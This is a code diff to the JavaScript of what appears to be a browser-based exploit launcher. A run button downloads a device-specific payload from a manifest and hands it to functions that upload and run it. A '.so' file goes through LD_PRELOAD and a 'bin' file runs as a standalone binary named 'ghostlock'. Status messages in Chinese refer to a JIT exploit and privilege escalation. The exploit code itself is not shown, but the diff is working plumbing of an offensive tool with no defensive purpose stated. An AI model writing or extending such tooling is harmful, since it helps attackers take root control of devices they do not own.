@@ -280,14 +280,15 @@
     btnRun.addEventListener('click', async function() {
       var idx = parseInt(sel.value);
       if (isNaN(idx) || !manifest || !manifest.devices[idx]) return;
-      if (!window.uploadSoAndRun) {
+      if (!window.uploadSoAndRun || !window.uploadBinAndRun) {
         if (typeof customAlert === 'function') customAlert('JIT Exploit 尚未完成，请等待');
         return;
       }
       var device = manifest.devices[idx];
+      var isBin = device.type === 'bin';
       
       btnRun.disabled = true;
-      btnRun.textContent = '下载 .so...';
+      btnRun.textContent = '下载中...';
       statusBar.textContent = '正在获取 ' + device.so + ' ...';
       
       try {
@@ -296,12 +297,15 @@
         var buf = await resp.arrayBuffer();
         
         btnRun.textContent = '执行中...';
-        statusBar.textContent = '正在上传 .so 并提权...';
+        statusBar.textContent = isBin ? '正在上传并运行 ghostlock...' : '正在上传 .so 并提权...';
         
-        // 利用 uploadSoAndRun 支持 File 对象的特性，
-        // 把下载的 ArrayBuffer 转成 File 对象传进去
+        // 根据设备类型分发：bin = 独立二进制执行，so = LD_PRELOAD
         var file = new File([buf], device.so.split('/').pop(), { type: 'application/octet-stream' });
-        await window.uploadSoAndRun(file);
+        if (isBin) {
+          await window.uploadBinAndRun(file);
+        } else {
+          await window.uploadSoAndRun(file);
+        }
         
         btnRun.textContent = '执行完成';
         statusBar.textContent = device.name + ' 提权流程结束，查看终端输出';
